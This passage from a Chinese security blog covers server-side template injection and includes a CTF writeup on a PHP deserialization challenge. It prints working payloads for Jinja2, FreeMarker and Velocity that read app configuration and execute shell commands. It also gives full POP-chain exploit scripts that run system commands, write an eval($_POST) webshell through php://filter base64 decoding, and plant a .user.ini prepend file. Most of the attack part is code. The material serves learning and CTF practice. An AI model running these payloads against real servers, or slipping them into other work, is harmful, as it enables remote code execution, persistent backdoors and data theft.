  <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,title=<span class="string">&#x27;Home&#x27;</span>,username=person[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>再在<code>templates</code>目录里写入<code>index.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;username&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIM%E6%88%AA%E5%9B%BE20200216213545.png"></p><p>再访问发现就没能成功解析出secret</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIM截图20200216213413.png" style="zoom: 67%;"><p><strong>漏洞成因在于</strong>：<code>render_template_string</code>函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，两个大括号在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把两个大括号包裹的内容当做变量解析替换。</p><h5 id="获取全局配置文件"><a href="#获取全局配置文件" class="headerlink" title="获取全局配置文件"></a>获取全局配置文件</h5><p>config是Flask模版中的一个全局对象，它代表”当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;person.secret&#125;&#125;</span><br><span class="line">&#123;&#123;self.__dict__&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>直接用Vlunhub上的exp：<a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h4 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h4><p>参见护网杯的一道题：<a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado</a></p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><h4 id="freeMarker"><a href="#freeMarker" class="headerlink" title="freeMarker"></a>freeMarker</h4><p>这个模板主要用于 java ,粗略得知new会导致安全问题，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p><p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/TIM%E6%88%AA%E5%9B%BE20200216163834.png"></p><p>payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br><span class="line"></span><br><span class="line">&lt;#assignob=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure><h4 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h4><p>Velocity 同样是一款备受欢迎的模板语言。然而它没有默认变量列表和 <em>安全问题</em> 页面帮助我们构建 payload。下面展示了 Burp Intruder 在枚举变量名时的截图：（变量名在 payload 行，服务器结果在其右边）：</p><img src="/2020/02/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1-variable-bruteforce.png" style="zoom:150%;"><p>这幅图中，被高亮的 class 能返回对象，看上去十分有趣。谷歌一下，我们发现了<a href="https://link.zhihu.com/?target=https://velocity.apache.org/tools/releases/2.0/summary.html">如下描述</a>：<br>ClassTool：在模板中实现Java的反射，默认参数：$key</p><p>这里有几个可利用的方法和属性：<br>$class.inspect(class/object/string)：返回正在审查类或对象的ClassTool实例<br>$class.type：返回被审查的类</p><p>换句话说，我们可以通过这两个类获得任意对象信息。再利用目标的Runtime.exec()执行任意命令嗯。通过如下模板，我们可以验证这一点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep <span class="number">5</span><span class="string">&quot;).waitFor() //延迟了5秒</span></span><br></pre></td></tr></table></figure><p>得到 shell 命令输出有点麻烦（毕竟java）：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#set($str=$class.inspect(&quot;java.lang.String&quot;).type)</span><br><span class="line">#set($chr=$class.inspect(&quot;java.lang.Character&quot;).type)</span><br><span class="line">#set($ex=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出 tomcat7</span></span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf新春红包题writeup</title>
      <link href="2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/"/>
      <url>2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/</url>
      
        <content type="html"><![CDATA[<p>记一下题目的writeup，收获很多！太菜了，那麽多方法一个不会！😭</p><a id="more"></a><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>题目原型为thinkphp 6.0反序列化，改自于2019高校运维赛ezpop,增加了点难度</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store, $key = <span class="string">&#x27;flysystem&#x27;</span>, $expire = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params">$expire</span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> $name</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使缓存文件名随机</span></span><br><span class="line">        $cache_filename = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . uniqid() . $name;</span><br><span class="line">        <span class="keyword">if</span>(substr($cache_filename, -strlen(<span class="string">&#x27;.php&#x27;</span>)) === <span class="string">&#x27;.php&#x27;</span>) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $cache_filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params">$data</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$name, $value, $expire = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> $filename;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>先介绍几个概念，POP，全称面向属性编程（<code>Property-Oriented Programing</code>，常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（<code>Return-Oriented Programing</code>）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。POP 链的构造就是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。</p><p>POP链：<code>A::__destruct()</code>=&gt;<code>A::save()</code>=&gt;<code>A::store-&gt;set()</code>==<code>b::set()</code>最后触发<code>$result = file_put_contents($filename, $data);</code></p><p>分析一下：</p><p>反序列化操作会执行<code>__destruct()</code>方法，B类没有该方法，而A类中有，所以我们跟进A类的<code>__destruct()</code>方法，发现<code>$this-&gt;autosave</code>为空或者0或false时执行<code>$this-&gt;save()</code>方法</p><ul><li>跟进第一行代码发现执行<code>$this-&gt;getForStorage()</code>，函数里又执行了<code>$this-&gt;cleanContents()</code>，传参为数组，再跟进，首先进行了反转键值的操作，遍历传过来的数组参数，如果该数组的值仍为数组，取与反转键值后新数组键名的交集存在<code>$contents</code>数组里，键为<code>$contents</code>的键，然后将<code>$this-&gt;complete</code>和完成上面操作的新数组json编码返回</li><li>跟进第二行代码，发现执行了某个对象的set方法，传了三个参数，我们可以将对象设为B，跟进，首先判断<code>$expire</code>是否为空，为空则取<code>$this-&gt;options[&#39;expire&#39;]</code>，然后调用了<code>$this-&gt;getExpireTime()</code>方法，该方法将传的参数强制int转换，然后调用了<code>$this-&gt;getCacheKey()</code>方法，生成一个<code>$this-&gt;options[&#39;prefix&#39;]</code>，微秒级时间戳和传过来参数拼接成的文件名，并且传过来的参数不能是<code>.php</code>,然后没有则创建文件夹，若传入的第二个参数是数字，就返回string类型转换的结果，否则返回<code>$this-&gt;options[&#39;serialize&#39;]($data)</code>，压缩数据，最后一个死亡退出，拼接序列化的结果写入拼接成的文件内</li></ul><p>大概思路已经清晰，bypass一些限制：</p><ol><li>文件名那里可以用<code>.php/.</code>而绕过</li><li>死亡退出那个地方可以用伪协议<code>php://filter/write=convert.base64-decode/resource</code>进行base64解码写入，可将shell先base64编码，注意要先把前半部分补齐去掉<code>&lt;?;&gt;()</code>这些无法被base64的字符，<code>php//exit</code>一共9个字符，再加上12个0，共21个，base64编码4个一组，因此我们需要再加3个</li></ol><p>以上是ezpop的思路，题目的变量便是文件名不可控，有三种思路：</p><h3 id="方式1-system"><a href="#方式1-system" class="headerlink" title="方式1(system)"></a>方式1(system)</h3><p>参见安全客文章:<a href="https://www.anquanke.com/post/id/194036">https://www.anquanke.com/post/id/194036</a></p><p>exp:(类加上就行)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$testB = <span class="keyword">new</span> B();</span><br><span class="line">$testB-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">$testA = <span class="keyword">new</span> A($testB, <span class="string">&quot;miao&quot;</span>);</span><br><span class="line">$testA-&gt;autosave = <span class="number">0</span>;</span><br><span class="line">$testA-&gt;cache = [<span class="string">&#x27;aaq&#x27;</span> =&gt; <span class="string">&#x27;`cat /flag &gt; ./flag.xml`&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($testA)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>首先autosave要为0，<code>$testB-&gt;options[&#39;serialize&#39;]</code>要为system函数，此时我们对最后的写文件没什莫要求了，但必须要执行到<code>$data = $this-&gt;serialize($value);</code>这步，<code>$testA-&gt;cache</code>要为system要执行的命令</p><h3 id="方式2-绕过"><a href="#方式2-绕过" class="headerlink" title="方式2(/../绕过)"></a>方式2(/../绕过)</h3><p>其实可以直接这样绕过，时间戳将会被认为一个目录，exp(加上类)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/&quot;</span>);</span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../a.php/.&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;s&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><img src="/2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/TIM截图20200210231552.png" style="zoom: 67%;"><h3 id="方式3-user-ini"><a href="#方式3-user-ini" class="headerlink" title="方式3(.user.ini)"></a>方式3(.user.ini)</h3><p>其实这个也是上面的思路，主要还是跨目录的缘故，如果<code>.php</code>不知道怎末绕可以用这种思路，exp(加上类):</p><p><strong>上传图片：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;</span>);</span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../../aaaaaa.jpg&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;moyu&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p><strong>上传<code>.user.ini</code>:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;</span>);</span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../../.user.ini&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&quot;\nauto_prepend_file=aaaaaa.jpg&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><img 